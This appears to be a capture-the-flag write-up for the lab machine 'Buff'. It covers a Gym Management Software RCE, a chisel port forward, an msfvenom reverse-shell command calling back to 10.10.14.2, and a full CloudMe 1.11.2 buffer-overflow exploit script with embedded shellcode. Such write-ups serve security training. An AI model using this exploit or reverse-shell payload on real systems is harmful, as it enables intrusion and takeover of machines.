# Buff

## Gaining Access

Nmap Scan:

<figure><img src="../../../.gitbook/assets/image (3039).png" alt=""><figcaption></figcaption></figure>

### Gym

On port 8080, it was a gym-related page:

<figure><img src="../../../.gitbook/assets/image (2910).png" alt=""><figcaption></figcaption></figure>

We can use `gobuster` on the website to find more directories:

<figure><img src="../../../.gitbook/assets/image (2698).png" alt=""><figcaption></figcaption></figure>

Checking the `contact.php` file, we see the software used to make this.

<figure><img src="../../../.gitbook/assets/image (3327).png" alt=""><figcaption></figcaption></figure>

Then, we can search for exploits for this Gym Management Software 1.0.

<figure><img src="../../../.gitbook/assets/image (742).png" alt=""><figcaption></figcaption></figure>

We can try the RCE exploit:

{% embed url="https://www.exploit-db.com/exploits/48506" %}

By running the exploit, we would gain a webshell:

<figure><img src="../../../.gitbook/assets/image (1666).png" alt=""><figcaption></figcaption></figure>

Afterwards, we can download `nc.exe` onto the machine via `smbserver.py`.&#x20;

<figure><img src="../../../.gitbook/assets/image (1660).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (3838).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### CloudMe

When enumerating the user's directory, we find a CloudMe\_1112.exe file:

```
C:\Users\shaun\Downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A22D-49F7

 Directory of C:\Users\shaun\Downloads

14/07/2020  13:27    <DIR>          .
14/07/2020  13:27    <DIR>          ..
16/06/2020  16:26        17,830,824 CloudMe_1112.exe
               1 File(s)     17,830,824 bytes
               2 Dir(s)   7,564,353,536 bytes free
```

When checking for exploits regarding CloudMe, we can find a few Buffer Overflow exploits that can be used for RCE using shellcode.

<figure><img src="../../../.gitbook/assets/image (3181).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://www.exploit-db.com/exploits/48389" %}

CloudMe for this machine runs on port 8888 on this machine, so we can just run it and use chisel to port forward port 8888.

```bash
# on Kali
chisel server --port 4444 --reverse

# on host
.\chisel.exe client 10.10.14.2:4444 R:8888:localhost:8888
```

Then, we need to generate new shellcode for the exploit:

{% code overflow="wrap" %}
```bash
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.2 LPORT=443 -b '\x00\x0A\x0D' -f python -v payload
```
{% endcode %}

The final script based on the PoC should look like this:

```python
# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

#msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.2 LPORT=443 -b '\x00\x0A\x0D' -f python -v payload
payload = b""
payload += b"\xdb\xc0\xb8\x78\xb6\x92\xc4\xd9\x74\x24\xf4"
payload += b"\x5b\x29\xc9\xb1\x52\x31\x43\x17\x03\x43\x17"
payload += b"\x83\x93\x4a\x70\x31\x9f\x5b\xf7\xba\x5f\x9c"
payload += b"\x98\x33\xba\xad\x98\x20\xcf\x9e\x28\x22\x9d"
payload += b"\x12\xc2\x66\x35\xa0\xa6\xae\x3a\x01\x0c\x89"
payload += b"\x75\x92\x3d\xe9\x14\x10\x3c\x3e\xf6\x29\x8f"
payload += b"\x33\xf7\x6e\xf2\xbe\xa5\x27\x78\x6c\x59\x43"
payload += b"\x34\xad\xd2\x1f\xd8\xb5\x07\xd7\xdb\x94\x96"
payload += b"\x63\x82\x36\x19\xa7\xbe\x7e\x01\xa4\xfb\xc9"
payload += b"\xba\x1e\x77\xc8\x6a\x6f\x78\x67\x53\x5f\x8b"
payload += b"\x79\x94\x58\x74\x0c\xec\x9a\x09\x17\x2b\xe0"
payload += b"\xd5\x92\xaf\x42\x9d\x05\x0b\x72\x72\xd3\xd8"
payload += b"\x78\x3f\x97\x86\x9c\xbe\x74\xbd\x99\x4b\x7b"
payload += b"\x11\x28\x0f\x58\xb5\x70\xcb\xc1\xec\xdc\xba"
payload += b"\xfe\xee\xbe\x63\x5b\x65\x52\x77\xd6\x24\x3b"
payload += b"\xb4\xdb\xd6\xbb\xd2\x6c\xa5\x89\x7d\xc7\x21"
payload += b"\xa2\xf6\xc1\xb6\xc5\x2c\xb5\x28\x38\xcf\xc6"
payload += b"\x61\xff\x9b\x96\x19\xd6\xa3\x7c\xd9\xd7\x71"
payload += b"\xd2\x89\x77\x2a\x93\x79\x38\x9a\x7b\x93\xb7"
payload += b"\xc5\x9c\x9c\x1d\x6e\x36\x67\xf6\x9b\xcd\x69"
payload += b"\x04\xf4\xd3\x75\x09\xbf\x5d\x93\x63\xaf\x0b"
payload += b"\x0c\x1c\x56\x16\xc6\xbd\x97\x8c\xa3\xfe\x1c"
payload += b"\x23\x54\xb0\xd4\x4e\x46\x25\x15\x05\x34\xe0"
payload += b"\x2a\xb3\x50\x6e\xb8\x58\xa0\xf9\xa1\xf6\xf7"
payload += b"\xae\x14\x0f\x9d\x42\x0e\xb9\x83\x9e\xd6\x82"
payload += b"\x07\x45\x2b\x0c\x86\x08\x17\x2a\x98\xd4\x98"
payload += b"\x76\xcc\x88\xce\x20\xba\x6e\xb9\x82\x14\x39"
payload += b"\x16\x4d\xf0\xbc\x54\x4e\x86\xc0\xb0\x38\x66"
payload += b"\x70\x6d\x7d\x99\xbd\xf9\x89\xe2\xa3\x99\x76"
payload += b"\x39\x60\xa9\x3c\x63\xc1\x22\x99\xf6\x53\x2f"
payload += b"\x1a\x2d\x97\x56\x99\xc7\x68\xad\x81\xa2\x6d"
payload += b"\xe9\x05\x5f\x1c\x62\xe0\x5f\xb3\x83\x21"

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))       

buf = padding1 + EIP + NOPS + payload + overrun 

try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target,8888))
        s.send(buf)
except Exception as e:
        print(sys.exc_value)
```

Afterwards, run it using `python3` and an administrator shell will spawn.

<figure><img src="../../../.gitbook/assets/image (774).png" alt=""><figcaption></figcaption></figure>

Rooted!
